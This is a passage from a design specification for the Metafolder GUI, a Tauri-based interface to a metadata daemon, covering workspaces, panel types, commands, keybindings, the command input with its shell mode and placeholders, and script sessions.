#+TITLE: Metafolder — GUI Specification
#+OPTIONS: toc:2 num:t

* Overview

The GUI is a graphical interface to the Metafolder daemon. It exposes the full
CLI surface in visual form: repository management (init/load/list), metarecord
CRUD, query execution, reconcile, and event log inspection. It communicates
with an already-running daemon over HTTP and does not manage the daemon's
lifecycle.

Four cross-cutting design principles govern the GUI:
- *Keyboard-first*: every command is reachable from the keyboard; all
  keybindings are configurable.
- *Command-driven*: a persistent status bar shows notifications; a command
  input accepts named commands and shell invocations.
- *Scriptable*: the GUI exposes its own local HTTP API so that external scripts
  can drive panels and wait for user input.
- *Themeable*: appearance is controlled by a CSS file loaded at startup.

The GUI is built with *Tauri* (v2): a Rust backend communicating with a
system WebView frontend. The shell frontend is *Svelte 5* (Vite build);
panel types are plain HTML/JS with no build step. The Rust backend owns all
canonical state (workspaces, layout, variables, keybindings, command
registry); the shell is a thin reflection updated through Tauri events, so
the scripting HTTP API and the window always agree.

* Concepts

** Workspace

A self-contained state container. Each workspace holds: the state of every
panel type that has been loaded in it during the session (scroll position,
query draft, display mode, etc.), the workspace variables, the status bar
history, and its *panel count* — whether it was last shown with one or two
panels while it owned the window (see [[*Layout and panels]]). Panel types
retain their state for the lifetime of the session — switching to a different
panel type and back restores the previous state. Workspace state is not
persisted across sessions; the GUI starts fresh each time.

The =active_repo= of a workspace is set when the workspace is created and
cannot be changed. To work with a different repository, a new workspace is
created (see [[*Tab bar]]). This prevents =selected_metarecord= and other workspace
variables from becoming invalid due to a repo switch.

** Panel slot

One of two fixed content areas in the window (left and right). Each slot is
assigned at most one workspace. An unassigned slot remains visible but shows a
centred "No workspace selected" message; the user can assign a workspace by
clicking a tab or using =workspace:new=. A workspace can be assigned to zero,
one, or both slots simultaneously.

When both slots display the same workspace, each slot independently selects
which panel type to show. This enables, for example, =metarecord-list= on the left
and =file= on the right within one workspace, sharing its variables
(=selected_metarecord=, etc.).

The two slots are separated by a draggable divider; the width ratio is part of
the window state (not per-workspace). The focused slot has a visible indicator
(border highlight — theme-controlled) and receives keyboard input.

** Panel type

The content/functionality kind displayed inside a panel. Each panel type is
implemented as a directory containing an =index.html= entry point; built-in
types ship as default examples in the user's config directory so they can be
inspected and modified. The panel type name is the directory name.

Built-in panel types:

| Name             | Description                                                  |
|------------------+--------------------------------------------------------------|
| =metarecord-list=     | Metadata metarecords filtered by an embedded query; primary selection source |
| =metarecord-detail=   | All fields of the selected metarecord; follows =selected_metarecord=   |
| =file=           | Preview of the file at the active path from =selected_paths=        |
| =file-manager=   | Filesystem tree navigator; browse and add files/dirs to the DB |
| =workspace-info= | Current workspace variables — useful for debugging and scripting |
| =message=        | Persistent log of status bar messages, shell output, and reconcile results |
| =log=            | Event log (revisions and operations)                         |
| =repos=          | Repository list, init, load, unload, per-repo running tasks, tracking notices |
| =treeref=        | TreeRef forest explorer; pick a TreeRef field, navigate roots→leaves |
| =trash=          | Repository trash-bin: list, restore, delete, empty (see [[file:spec-trash.org][spec-trash.org]] "GUI") |
| =duplicates=     | Groups of byte-identical files, worst reclaimable space first (see [[file:spec-duplicates.org][spec-duplicates.org]] "GUI") |
| =recent=         | The metarecords most recently viewed in this GUI, newest first; the =recent= picker's panel form |
| =sync=           | Cross-repo sync: status, plan, show, run (see [[file:spec-sync.org][spec-sync.org]]) |
| =help=           | In-app help: static pages with a grep search box (see [[*Help]]) |

Users can add custom panel types by creating a new directory under
=~/.config/metafolder/gui/panel-types/<name>/=. Custom types appear alongside
built-in types in the panel type selector.

Each panel type retains its full state for the lifetime of the session, even
when not displayed. Switching to another panel type and back restores the
previous state unchanged.

Panel *construction* is separate from the *first display*: loading the
iframe registers commands, keybinding suggestions and listeners, but a
panel's expensive work — the directory listing of =file-manager=, the log
fetch, streaming the previewed file — is deferred to the first actual
display via =metafolder.whenVisible(fn)=
(=metafolder.visible= exposes the current state; while hidden, repeated
triggers re-arming the same callback coalesce into one run on show). The
shell pre-instantiates every installed panel type once at startup, hidden,
for the startup workspace: all panel commands are registered from the
start at the cost of construction only, without daemon traffic.

** Display mode

The visual representation used within a panel type that supports several
layouts. Stored as part of the panel type's state in the workspace.

The =metarecord-list= panel type supports at minimum:
- =table= — tabular list with configurable columns.
- =grid= — thumbnail grid, useful for image collections.

=metarecord-list= runs its query *eagerly* on the first display, and again
whenever a repo becomes active: the (possibly empty) query is executed and the
repo's contents shown straight away, rather than waiting for an explicit apply
or =metarecord-list:refresh=. Queries are fast enough that showing the list is
the better default. The list stays empty only while there is no active repo.
(Historically this panel deferred its query until an explicit user action; the
value-picker case — =pick_request=, where rows are needed to pick from — was the
one exception and is now subsumed by the eager run.)

For large result sets, =metarecord-list= uses the daemon's cursor pagination
(=limit= / =cursor= / =sort= on =POST /query=, see the Pagination section of
[[file:spec-data-model.org][spec-data-model.org]]), fetching further pages as
the user scrolls; a footer shows =loaded/total= rows (the total from the
daemon's =count=). Scrolling is not the only way down: moving the selection
past the last loaded row (=metarecord-list:next=) fetches the next page too,
so keyboard and script navigation reach the whole result set even when the
panel is not the displayed one (no scroll event ever fires there). The default page size comes from the GUI config
(=[page-size].metarecord-list= in =config.toml=, default 100) — the smallest of
the list panels, as each row needs several daemon round-trips (TreeRef path
resolution, ref-target metarecords) and parsing. It is further overridable per
workspace: =metarecord-list:set page-size <n>= persists it in the
=metarecord-list:page-size= workspace variable (also settable by scripts);
invalid stored values fall back to the config default.

Orphaned metarecords — a metarecord with =mfr_path= whose file no longer
exists on disk, either =mfr_path = Nothing= (the watcher saw the deletion)
or a stale TreeRef (left in place by reconcile, see
[[file:spec-file-tracking.org][spec-file-tracking.org]]) — are made visible:
=metarecord-list= colours the row/card (theme variable =--mf-orphan=, purple
by default) with a tooltip giving the reason; =metarecord-detail= shows a
one-line note under the metarecord head. A metarecord with no =mfr_path=
field at all is not a file metarecord and is never marked.

** Workspace variables

A reactive, per-workspace key-value store shared across all panel types
loaded in the workspace. Panel types read and write these variables to communicate without
being directly coupled to each other.

Standard variables:

| Key                | Type                          | Description                        |
|--------------------+-------------------------------+------------------------------------|
| =active_repo=      | =string \vert null=           | UUID of the active repository      |
| =selected_paths=   | =string[]=                    | Absolute paths of the highlighted filesystem metarecord (usually one; multiple if the metarecord has several =mfr_path= values) |
| =selected_metarecord=   | =\{uuid, repo\} \vert null=   | Metadata metarecord for the highlighted path (null if untracked) |
| =selected_metarecords= | =string[]=                    | UUIDs of all selected metarecords      |
| =selected_treeref= | =\{repo, field, uuid, path\} \vert null= | TreeRef node selected in the =treeref= panel |
| =pick_request=     | =\{caller_ws, token, picker_slot, restore\} \vert null= | Set on a *picker* workspace at creation; marks it as a value picker linked back to =caller_ws=, with the slot to restore on close (see [[*Value picker]]) |
| =pick_result=      | =\{token, uuid\} \vert \{token, path\} \vert \{token, cancelled\} \vert null= | Delivered to the *calling* workspace when a picker confirms (=uuid= or =path=, per the request's =result= kind) or cancels; the requesting form matches =token= and consumes it |

Panel types may define their own variables using namespaced keys (e.g.
=my-panel:current-node=).

** Value picker

Filling a =ref= or =tree_ref= field with a metarecord UUID by hand is
impractical. Instead, a field-editing form opens a *picker*: a normal,
throwaway workspace the user drives with the existing panels (lists, the
=treeref= explorer, …), then confirms a selection that is handed back to the
form. No new selection UI is duplicated into the forms; the picker reuses every
panel, keybinding and future navigation improvement.

The mechanism is a thin protocol over [[*Workspace variables][workspace
variables]], with the only cross-workspace step performed in the GUI backend
(panels can read/write only their own workspace's variables):

1. *Start* — the calling panel invokes the =metafolder.pick.start(spec)= API
   (structured arguments; not a string command). =spec= fully describes the
   picker's initial state — the caller decides everything, because only it
   knows what its picker is for: the active repo, the picker =panel= type with
   its seed variables, a workspace =name=, and a =prompt= shown in the picker's
   status bar. The backend creates a workspace, stores
   =pick_request = \{caller_ws, token, picker_slot, restore\}= on it, and opens
   it in the slot *other* than the caller's — so the calling form stays visible
   in the focused slot — then focuses the picker and posts the prompt. The
   other slot's prior state is remembered in =restore= and reinstated when the
   pick ends. The =token= is an opaque value the caller mints to match the
   result to the exact widget that requested it.

2. *Navigate* — the picker behaves like any workspace; highlighting an entry
   publishes =selected_metarecord= as usual.

3. *Confirm / cancel* — =pick:confirm= reads the focused picker's
   =pick_request= and the requested selection, closes the picker, restores the
   slot it occupied, refocuses the caller, and writes =pick_result= into
   =caller_ws= (the single cross-workspace write). =pick:cancel= writes
   =\{token, cancelled: true\}= instead. Closing a picker by hand is a cancel.

The =result= kind in the spec chooses what is returned:
- =uuid= (default) — the picker's =selected_metarecord=; =pick_result= is
  =\{token, uuid\}=. The form decides where it lands: for =ref= it is the
  value; for =tree_ref= it fills the =parent= slot, leaving the =name= for the
  user to type (e.g. picking =/document/test= (uuid =123=) for a new field
  =plop= yields =\{123, ""\}=, then the user types =plop= →
  =\{123, "plop"\}= → path =/document/test/plop=).
- =path= — the picker's first =selected_paths= entry; =pick_result= is
  =\{token, path\}=. Used to choose a folder with the =file-manager= panel
  (e.g. the repos panel's *Browse…* button — the picker opens =file-manager=
  on the disk, the user highlights a folder, =.= being the current directory).

Seeding is configurable per field name, see [[*Picker seeds]]. The calling
panel reads the mapping through the API and folds it into =spec=, so the seed
policy stays the caller's decision.

** Command

A named, invocable operation with an optional parameter string. Commands are
registered by panel types (built-in or custom) and are available in the
command input with autocomplete. Every user-visible behaviour is a command.
Keybindings map key combos to command invocation strings (command name plus
optional parameters).

Every registered command is listed in the autocomplete and invocable by
name, whatever panel is focused: invocations are dispatched to the panel
type that registered the command (in the focused workspace), so acting on
an unfocused — or hidden — panel is legitimate (e.g. the file panel's
arrow keys drive =metarecord-list:next= / =metarecord-list:prev= in the other slot).
Focus-dependent behaviour belongs to keybindings (=when=, see
[[*Keybinding]]), not to commands. Panel commands are registered when the
panel type is instantiated; the shell pre-instantiates every installed
panel type once at startup (hidden, see [[*Panel type]]), so all command
names are known from the start. The registry survives iframe removal
(workspace closed): a later dispatch re-instantiates the owner lazily.

Discoverability rule: every interactive control's action is reachable as a
registered command, and every edit zone has a command that focuses (or
opens) it. So each top-level action button in a panel or the shell maps to a
command (the button invokes it), and each text input has a focus command —
the command input (=command-input:focus command=), the metarecord-list query and
columns inputs (=metarecord-list:focus simplified=, =metarecord-list:focus columns=),
the workspace rename (=workspace:rename=), the metarecord-detail add-field
form (=metarecord:open-add-field=). Shell controls map to the panel commands
(=panel:set type=, =panel:swap=, =panel:split=, =panel:hide=). Transient
controls *inside* a flow already opened by a command — a form's =Cancel=, a
folder picker's navigation, a form's submit — and inherently positional
controls — an individual tab or a specific slot's =×= (their action is
covered by =workspace:goto= / =workspace:close= / =panel:hide=) — need not
each carry their own command.

Naming: a panel type's commands are prefixed with the panel type
(=metarecord-list:next=), the shell's own with the concept they act on
(=panel:split=, =workspace:new=). A command that is simply *the GUI half of a
=mf= subcommand* — same work, same fields, the CLI's orchestration — takes the
=mf:= prefix and the CLI verb, so the link is immediate: =mf:order= is
=mf order=. (=reconcile:run= predates the rule and keeps its name.)

Each command carries a =log= flag (default =true=): when set, every
invocation is echoed to the workspace [[*Message view][message panel]] as
=​> name args= before the command runs. Panels register commands with
=log= (=metafolder.commands.register=); the builtin editing primitives
(=editing:*=, =command-input:focus command=) register with =log: false= so
keystroke-level actions do not flood the log.

A command may *declare its arguments*. Each declared argument carries up to
four functions, all evaluated *lazily* when the argument is asked for (never
at registration) and all receiving the arguments already collected so far: a
=prompt= (the text shown in the command input), an optional =initial= (a
pre-filled, editable value — e.g. the current value of the field being
edited), an optional =complete= (the candidate list offered by the
input's autocomplete), and an optional =when= (whether the argument applies at
all). =when= is what lets *one* command cover a family of operations: the
declared arguments are the union of what any operation takes, and the ones an
operation has no use for are dropped — =metarecord:bulk delete= names no
field, =metarecord:bulk unset= no value. Because it only ever sees *prior*
arguments, it is always decidable by the time the argument is reached, and a
dropped argument consumes no inline token either. Because =initial= is a function and not a constant, it
can read live state at the moment of the prompt. When a command with declared
arguments is invoked with fewer parameters than declared (from a keybinding,
the command input, or =POST /gui/command=), the command input collects the
missing arguments one at a time: for each, it shows the =prompt=, pre-fills
=initial=, offers =complete= (filtered like command suggestions), and waits.
=Escape= at any point abandons the whole invocation. A panel command's
declared arguments belong to the *panel instance* that registered them, not to
the command name: a panel type is mounted once per workspace, every instance
registers the same names, and the four functions read the state of the one
that declared them. The prompts come from the instance of the *focused*
workspace — the same one the handler runs on — so a completion list can never
be another workspace's. Parameters supplied inline skip their prompt, so a
fully-specified invocation
(=metarecord:field edit tag musique/jazz=) runs without prompting — the
interactive collection is a fallback for the missing tail, not a separate
mode.

The command-input autocomplete distinguishes the two kinds of command by the
menu-item *ellipsis convention*: a command that, invoked bare, reopens the
minibuffer to collect input shows a trailing =…= after its name; a command
that acts immediately (selecting or opening a DOM element, toggling a panel)
shows none. A command prompts when it declares arguments (the interactive
collection above) or is one of the few builtins that reopen the input by hand
(e.g. =workspace:rename=). The marker is display-only — it is not part of the
command name written into the input when a suggestion is accepted.

*Dead keys.* A keybinding whose command does not exist runs nothing and says
nothing, so a typo — or a command renamed out from under a personal
=keybindings.toml=, which =metafolder-sync-config= merges but never validates —
is silently inert. Once the panels have been pre-instantiated (and therefore
every command name is known: the builtins come from Rust, the panel commands
from their JavaScript), the shell lists any such binding in the
[[*Message view][message panel]], combo and invocation. Only the first token of
an invocation is a name, since a binding may pre-fill arguments. The shipped
table is checked the same way by a test, so a rename cannot leave a default
binding dead either.

*Command listing.* The input lists every registered command, plus one entry
per *bound* parameterized invocation: a keybinding whose invocation carries
arguments (=metarecord:bulk delete=, =panel:set type file=) earns its own line,
showing its combo. This is what keeps a generic command's genericity from
costing discoverability. Naming an operation as an argument instead of in the
command name would otherwise hide it — =metarecord:bulk set= is not findable by
typing =set= if only =metarecord:bulk= is listed — while listing every
combination a command accepts would bury the list under variations nobody uses.
Keying the expansion to the keybinding table answers both: whatever the user
put on a key is discoverable by reading the list, and the rest is found through
the operation's own prompt. It also makes every shortcut visible in one place,
parameterized ones included. Combos are attached by *exact* invocation, so a
bare entry does not collect its variants' keys — =panel:set type= otherwise
listed all fourteen of them on one line, with nothing saying which combo went
with which panel type. Consequently the =…= marker is computed per *entry*,
not per command: =metarecord:bulk set= still has a field and a value to ask
for and carries it, while =metarecord:bulk delete= is complete and runs on
Enter.

*Naming convention.* One rule generates the whole command set:

#+BEGIN_QUOTE
=<namespace>:<verb> [arguments]=, the verb taken from the closed list below,
and *whatever varies between sibling commands is an argument, never part of
the verb*.
#+END_QUOTE

So there is no =zoom-in= beside =zoom-out=, no =bulk-set-field= beside
=bulk-delete=: one =zoom=, one =bulk=, each taking what varies. The set stays
small enough to read, a keybinding says what it does
(=metarecord:bulk delete=), and adding a variant costs a table entry instead
of a command. The [[*Command listing][listing]] is what keeps this from
costing discoverability.

The verbs, grouped by *what they touch* — which is the thing a name must make
obvious, so that nothing that writes to the repository can be mistaken for
something that only moves the view:

| touches | verbs |
|---------+-------|
| a text zone | =focus <zone>=, =clear <zone>=, =apply <zone> [stay]=, =insert <zone> <text>= |
| a form, overlay or panel | =open [what]=, =open-X= (a form of this panel), =close=, =cancel=, =reveal <type>= |
| a view flag | =toggle <flag>= |
| the cursor or the selection | =next=, =prev=, =first=, =last=, =page <which>=, =find [text]=, =select <toggle\|all\|none>=, and the =row-X= family (the row under the cursor) |
| a view setting | =set <setting> [value]= |
| the media player | =play-pause=, =restart=, =mute=, =seek <±s>=, =speed <up\|down\|reset>=, =volume <up\|down>=, =zoom <in\|out\|fit\|reset>= |
| the repository | =<noun> <op>= with =op= ∈ =set= / =add= / =remove= / =unset= / =delete= (the daemon's and the CLI's vocabulary), and the plain verbs =create=, =delete=, =rename=, =track=, =trash=, =restore=, =prune=, =reconcile=, =rollback=, =undo=, =redo=, =revert [what]=, =mark=, =run=, =load=, =unload=, =stop= |

The screen/repository split therefore reads off the name: *a command that
writes to the repository carries either =<noun> <op>= or a plain verb from the
last row; everything else only moves the view.*

Two forms are kept although the rule alone would fold them away, and
deliberately:
- =open-X= names a *form belonging to this panel* (=metarecord:open-add-field=,
  =metarecord-list:open-bulk-edit=, =repos:open-init=). Folding it into
  =open <what>= would collide with a bare =X:open= that means something else —
  =repos:open= shows the repos panel, it does not open a form.
- =row-X= is the cursor family (=metarecord:row-next= / =row-edit= /
  =row-delete=). It is deliberately not =field-X=: that would put
  =metarecord:field-edit= one hyphen from =metarecord:field edit=, which asks
  *which* value to edit instead of taking the one under the cursor.

=edit-= is not a verb. A command that merely focuses an input is =focus=, one
that opens a form is =open=, and an edit through the minibuffer is =<noun>
<op>= — so nothing is named for the fact that typing happens.

** Keybinding

A mapping from a key combo (e.g. =ctrl+k=, =alt+x=, =g g= for a two-key
sequence) to a command invocation string (e.g. =metarecord-list:set mode grid=).
Keybindings are loaded from a configuration file and can be edited at runtime.
No keybinding is hard-coded; the defaults ship in the default config file.

The user's =keybindings.toml= contains only their customisations and
overrides; it does not need to list every binding. The GUI engine supplies all
defaults separately and merges them at startup, with the user file taking
precedence.

A combo is a key name, optionally prefixed by modifiers in the order
=ctrl+alt+shift+meta=; a sequence separates its combos with spaces. =shift= is
written only where the keyboard does not already spell it: the character a
shifted key *produces* is the key name (=:=, not =shift+;=), so =shift= is
carried only by keys whose shifted form is not a distinct character — a special
key (=shift+enter=, =shift+left=), a key held with another modifier
(=ctrl+shift+z=), and a **letter** (=shift+f=), whose shifted form differs only
in case and would otherwise collapse onto the unshifted binding.

Each keybinding has three independent scope dimensions:

- =when= (optional) — restricts the binding to a specific panel type. Absent
  means the binding is *global* (fires regardless of which panel type is
  focused). A panel type name (e.g. =metarecord-list=) makes it *local* (fires
  only when that panel type is focused).
- =text-input= (boolean, default =false=) — whether the binding also fires
  when a text input is focused (command input or field editor). =false= means
  the binding is suppressed while the user is typing; =true= means it fires
  regardless. A focused form control — =input=, =textarea=, =select= (so its
  arrow keys drive the options, not panel shortcuts), or a contenteditable —
  counts as a text input; the check consults both the event target and the
  focused element (an open native =select= popup may target neither).
- =focus= (optional) — restricts the binding to a specific focused *widget*
  inside a panel, identified by a =data-mf-focus="<scope>"= attribute on (or
  around) the focused element. This is finer-grained than =when=, which can
  only name a whole panel type: a panel may hold several text inputs (the
  metarecord-list has a finder, a query editor and a columns editor) and a
  =focus= binding targets exactly one. A =focus=-scoped binding **fires even
  while a text input is focused** (it bypasses the =text-input= gate — the
  widget it targets is itself typically an input); an optional =when= may be
  combined with it to also require a panel type. Absent means the binding is
  not widget-scoped. The scope is read from the DOM =composedPath()= of the key
  event, so it works across the panel Shadow DOM.

The dimensions combine independently:

| =focus=      | =when=         | =text-input= | Fires when                                        |
|--------------+----------------+--------------+---------------------------------------------------|
| absent       | absent         | =false=      | Any panel focused; no text input active (default) |
| absent       | absent         | =true=       | Any panel focused; even inside a text input       |
| absent       | =<panel-type>= | =false=      | Named panel focused; no text input active         |
| absent       | =<panel-type>= | =true=       | Named panel focused; even inside a text input     |
| =<scope>=    | (either)       | (ignored)    | The =data-mf-focus="<scope>"= widget is focused   |

When the same key matches several bindings, a more specific binding wins:
=focus= over =when= over global, and among non-=focus= bindings =text-input =
false= over =text-input = true= (the less permissive one takes precedence when
both would fire). A =focus= binding therefore always beats a non-=focus= one
for the same combo, which is what lets e.g. the arrow keys and =ctrl+enter=
drive the metarecord-list selection while the caret sits in its finder input.

Multi-key sequences never expire: once a prefix is typed, the matcher
waits indefinitely for the next key. While a sequence is pending, the
shell shows the possible continuations (keys and invocations) in a strip
above the status bar — also for sequences typed inside a panel iframe
(the panel matcher forwards its pending state to the shell). =escape=
cancels the pending sequence (it never matches an =escape= binding in
that state); a key that fits no continuation aborts the sequence and is
*swallowed* — it does not fall back to its own single-key binding (a combo
in progress takes priority), and the shell flashes ='<sequence>' is
undefined=. The defaults use this for panel type switching: =t=
followed by one letter (=t l= metarecord-list, =t d= metarecord-detail, =t f=
file, =t m= file-manager, =t o= log, =t r= repos, =t g= message, =t w=
workspace-info, =t t= treeref, =t b= trash, =t y= sync, =t v= recent, =t u=
duplicates, =t h= help).

Config file examples. A combo's value is either a single binding table, or —
when the same combo maps to a different command depending on the focused panel
— an array of tables, each scoped with its own =when=:

#+BEGIN_SRC toml
"escape"  = { command = "editing:unfocus",         text-input = true              }
"ctrl+a"  = { command = "editing:goto line-start", text-input = true              }
"ctrl+e"  = { command = "my-panel:edit",           when = "my-panel", text-input = true }
"ctrl+t"  = { command = "workspace:new"                                            }

# The same combo, several scopes: one array, one entry per `when`.
"j" = [
  { command = "metarecord-list:next", when = "metarecord-list" },
  { command = "file-manager:next",    when = "file-manager" },
]
#+END_SRC

Override granularity is per =(combo, when)=: a user entry for =j= /
=when = "metarecord-list"= replaces only that scope, leaving the other =j=
bindings intact. Removing a binding at runtime (settings view) likewise targets
one =(combo, when)=.

Panel types may suggest default keybindings via =metafolder.addKeybinding=;
these are the weakest layer, applied only when no configured binding has the
same combo and =when=. The built-in panels declare all of their bindings in the
shipped =keybindings.toml= (as =when=-scoped arrays) rather than suggesting
them, so every shortcut is visible and editable in that one file;
=addKeybinding= remains for third-party panels.

** Status bar

A read-only line at the very bottom of the window, always visible and never
focused. Displays status messages, error notifications, the name of the last
executed command (dim text), and a spinner during long operations. Content is
*per-workspace*. When both slots display the same workspace, one status bar is
shown; when the two slots display different workspaces, two status bars are
shown (one per slot). Messages auto-clear after a configurable timeout
(default 5 s).

A running script's *question* does **not** share this line. When a
=POST /gui/input= wait carries a =prompt=, that question — and the keys the
wait accepts — is shown in a *dedicated bar* just above the status line (the
same place as the pending key-sequence reminder), so a status or error message
can never overwrite the question the user is being asked. The bar clears when
the wait resolves. It also carries the "script keys" checkbox and a reminder
that escape stops the script (see [[*Script keys]]).

** Command input

A single-line text input permanently visible just above the status bar,
with two modes distinguished by the prompt character. A configurable
keybinding gives it keyboard focus in either mode (default suggestions:
=:= for *command mode*, =!= for *bash mode* — =command-input:focus bash=);
=Escape= removes the focus (the draft is kept). There is one command input;
it targets the focused slot's workspace. Content (text and cursor position)
is per-workspace *and per-mode*: switching the focused slot to a different
workspace restores the command input state of that workspace, including any
partial command being typed, and switching modes preserves both lines.

*Command mode* (=:= prompt) accepts a command name (with inline completion)
optionally followed by space-separated parameters. The suggestion list is
filtered fuzzily and case-insensitively: the draft is split on whitespace
and the terms must appear in the command name in order ("con def" matches
like the regex =.*con.*def.*=). The first (best) suggestion is always
selected; =Up=/=Down= move the selection. =Tab= writes the selected
suggestion into the input (without executing); =Enter= always runs exactly
what is typed — never the selection, since one is always highlighted.
Because spaces are fuzzy term separators, the list simply empties when
typed arguments stop matching any command name. Typing =!= at the start of
an empty command-mode draft switches to bash mode (continuity with the
historical single-input =!command= syntax).

*Bash mode* (=!= prompt) accepts a shell command — executed as a subprocess;
stdout/stderr goes to the =message= panel type and to the terminal from
which the GUI was launched. Running it switches the focused slot to the
=message= panel type so the output is visible, unless a =message= panel is
already visible in the workspace. In invocation strings (keybindings,
=POST /gui/command=) a shell command is still written with the =!= prefix:
the mode split is a UI affordance, not a wire-format change.

*** Interactive command arguments (command mode)

When the invoked command declares arguments (see [[*Command]]) and the typed
line supplies fewer than declared, the input does not error: it collects the
missing arguments in order, reusing the same prompt/autocomplete machinery as
a script's =POST /gui/prompt= — the prompt character shows the argument's
=prompt= text, the field is pre-filled with its =initial= value, and the
suggestion list offers =complete='s candidates filtered like command names.
Unlike command mode (where =Enter= always runs the typed text), a prompt
=Enter= accepts the *highlighted completion* and advances to the next
argument — no =Tab= needed. To submit a *new value* that is not in the list
(even one that ordered-substring-matches an existing candidate), either
=Ctrl-Enter=, or =Up= past the top of the list to deselect it (the minibuffer
itself) and then =Enter=; with no candidates highlighted, or none offered,
=Enter= submits exactly what was typed. =Escape= abandons the whole
invocation. Only one prompt owns the input at a time: an
interactive argument collection and a script prompt are mutually exclusive
(whichever holds the input makes the other refuse to start).

*** Bash completion (bash mode)

=Tab= in bash mode completes the word before the cursor by asking =bash=
itself (never live while typing): when the =bash-completion= package is
installed its programmable completions are used (e.g. =git= subcommands),
otherwise a =compgen= fallback completes command names in command position
and filenames elsewhere (directories decorated with a trailing =/=). A
single candidate is inserted directly (with a trailing space, unless a
directory); several candidates first extend the word to their longest
common prefix, then are listed like command suggestions — =Up=/=Down=
select, =Tab= inserts the selection. Unlike command mode, =Enter= always
runs the typed line (as in bash); any edit invalidates the candidate list.
The completion harness never expands or executes the typed line itself (no
=eval=; tokenization is plain whitespace splitting, with the replaced word
approximating readline's word breaks — quotes, =VAR==, =host:=). A missing
=bash= disables completion with a status-bar error; candidates are capped
at 500 and completion at 3 s.

*** Placeholders in =!= commands

A =!= command line may reference the *selection* and the *active workspace*
through =%=-tokens, expanded *client-side* just before the command runs — so
the GUI can pass their identity to user scripts:

| Token            | Expands to                                                       |
|------------------+------------------------------------------------------------------|
| =%u=             | the selected metarecord's UUID (=workspace.selected_metarecord=) |
| =%v=             | its =version=                                                    |
| =%p=             | the selected file's OS-absolute path (=workspace.selected_paths=) |
| =%r=             | the active repository's UUID (=workspace.active_repo=; =%r:uuid=) |
| =%r:name=        | the active repository's name                                     |
| =%<field>=       | the value of a single-valued scalar field                        |
| =%<field>:path=  | a =TreeRef= field resolved to its path *within that forest*       |
| =%%=             | a literal =%=                                                    |

=<field>= is a field name (=[A-Za-z_][A-Za-z0-9_]*=); =u=, =v=, =p=, =r= are
reserved shorthands. A =%= not followed by =%= or a name is left literal
(e.g. =50% off=). =%p= and =%r= read their workspace var directly, so they do
not need a selected *metarecord* (=%p= works for an untracked file).

=%p= and =%<field>:path= are *not* the same path. =%p= is the selected file's
absolute path on disk (the panel's resolved =selected_paths=). =%<field>:path=
is the position of a =TreeRef= field in *its own* forest, resolved through
=…/resolve-tree= — for =mfr_path= that is the repository-relative tree path, not
the on-disk path. To hand a script the file on disk, use =%p=; use
=%<field>:path= to follow an arbitrary tree field.

Each substituted value is shell-quoted, so paths with spaces are safe.
Substitution is *strict*: if a token cannot be resolved — nothing is selected,
no active repository, no/several selected paths, the field is absent,
multi-valued, or empty, or a bare =%<field>= names a =TreeRef= (use =:path=) —
the command is *not* run and the reason is posted to the status bar. Only =!=
commands are expanded; named commands are not.

** Script session

An external process communicating with the GUI over the GUI API. A script
session can set panel types, display messages in the status bar, activate the
command input with a prompt, and block waiting for user key input. Only one
script session may hold the input-wait lock at a time.

*** Ownership of a script's workspaces

Everything a script puts on screen belongs to the *workspaces that script
owns*: the workspace it was launched from, plus every workspace it creates
(=POST /gui/workspaces= carrying its run id — a script that opens two scratch
workspaces owns both). Its question bar, its =POST /gui/prompt= question in the
command input and its [[*Task bar]] entry are shown only while at least one
owned workspace is in a visible slot, so switching tab puts the script's
questions away instead of leaving them over unrelated panels. A wait with no
run id is owned by nobody and is always shown.

The keys follow the bar: while the question is put away, they are not
intercepted either — the panel now in front of the user keeps its own =y=, and
escape does not stop a script whose question is off screen.

The command input follows the same rule, and the line follows the question: a
prompt put away gives the input back to the user — its own prompt character,
its own per-workspace draft, its history and =Enter= running commands again —
while the answer typed so far is kept and restored, with the focus, when an
owned workspace returns to a slot. The script keeps waiting throughout; nothing
is cancelled by looking elsewhere. An [[*Interactive command arguments (command
mode)][interactive argument collection]] belongs in the same way to the
workspace its command was invoked from.

*** Working vs. awaiting an answer

The task-bar entry distinguishes the two states, because a script alternates
between long daemon round-trips and questions and the user must know when it is
their turn: it *spins* while the script works — next to its determinate bar when
it reports one, not instead of it — and while the script blocks on
=POST /gui/input= / =POST /gui/prompt= it stops moving and says the answer is
awaited. *Motion* is the signal, so a script that reports =done=/=total= must
still spin: a bar that only advances between questions stands as still as a
blocked one, and the entry then reads as idle for the whole time the script
works.

*** Answer keys

A question awaits the keys the script lists. By convention the shipped scripts
offer the arrow keys next to the letters, with a mapping that is the same
everywhere: =→= yes, =←= no, =↑= mixed, =↓= skip. A walk over a tree also
offers =skip=, which leaves the entry alone — for a folder, its whole subtree.

*** Script keys

While a question is up, the keys it awaits are *borrowed from the GUI*: they
take absolute priority over every panel and global binding, so a script
offering =y/n/s= is never in conflict with an =n= binding in the focused panel.
That is what makes a question answerable without looking — and what makes the
panel underneath unusable meanwhile.

The question bar therefore carries a *checkbox* ("script keys"). Unticked, the
script's keys are given back: the temporary answer bindings are removed from
the compiled table (not merely ignored — a disabled key must not stay bound as
a fallback) and every key means again what it means in the panel. The question
stays on screen, with its keys struck through, and can still be answered by
typing =answer:send <value>= in the command input, or by ticking the box again.

=script-keys:toggle= flips it (default =tab=). The choice holds for the rest of
the session, so a user who works with the keys off is not made to untick at
every question — but *every new run starts with its keys live*, so a script is
never silently deprived of the answers it is waiting for.

*** Reserved keys

Four combos are the user's way out of a question, and a script may not take
them: =escape=, =backspace=, whatever activates the command input (=:=), and
whatever toggles the script keys (=tab=). The two literals are reserved
unconditionally; the other two are derived from the compiled keybinding table,
so rebinding =command-input:focus command= moves the reservation with it.
=POST /gui/input= *rejects* a wait that asks for one of them (=400=), rather
than accepting a question the GUI would not honour.

=escape= is the way out of the *run*; =backspace= is the way out of an *answer
already given*. It does not end anything: it resolves the wait with the value
=back=, and the script decides what that means — only the script knows what its
last answer wrote. A script that supports it lists =b= among the keys it awaits
(so the letter works too, and the question can advertise it); one that does not
is simply asked again, so the key is never a silent no-op and never falls into a
default branch that would stop the run.

The shipped walks implement it through the event log, which is what makes it
exact: the operation id is noted before each answer (=mf log head=), and going
back returns the history to it (=mf log rollback --id=), restoring the very
field rows and versions the answer replaced. The walk position, the counters and
any subtree the answer had settled are restored with it — so the re-asked
question can be answered differently and everything under it is seen again.
Answers stack, so =back= can be pressed repeatedly, back to the first question.

Escape, while the script keys are enabled, *stops the asking script*: the run's
whole process group is signalled (=SIGTERM=, then =SIGKILL= if it is still
there two seconds later), which takes the =mf gui input= blocked on the
